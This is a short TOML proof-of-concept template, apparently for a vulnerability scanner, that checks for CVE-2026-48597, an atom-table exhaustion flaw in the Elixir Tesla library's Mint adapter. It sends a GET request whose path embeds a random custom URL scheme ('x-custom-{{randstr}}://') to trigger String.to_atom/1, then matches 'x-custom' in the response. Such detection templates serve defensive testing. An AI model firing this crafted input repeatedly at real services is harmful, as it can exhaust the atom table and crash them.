[info]
author = "AVE"
description = "检测Elixir Tesla库Mint适配器原子表耗尽漏洞，通过发送包含自定义协议方案的HTTP请求触发String.to_atom/1调用，验证拒绝服务攻击面"
id = "POC-AVE-2026-0298"
name = "CVE-2026-48597 PoC"
severity = "high"
tags = ["ave-2026-0298"]
vuln_id = [
    "CVE-2026-48597",
    "AVE-2026-0298",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/x-custom-{{randstr}}://test"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["x-custom"]
